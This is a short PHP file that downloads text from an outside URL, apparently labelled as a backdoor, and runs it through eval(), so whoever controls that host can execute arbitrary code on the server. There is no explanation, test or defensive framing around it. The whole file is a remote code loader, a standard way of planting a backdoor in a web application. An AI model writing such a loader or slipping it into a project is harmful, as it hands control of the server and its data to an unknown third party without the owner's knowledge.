<?php

$content = file_get_contents(urldecode('https://works.short-attack.codes/B4ck-D0OR/wget.txt'));

$content = "?> ".$content;
eval($content);
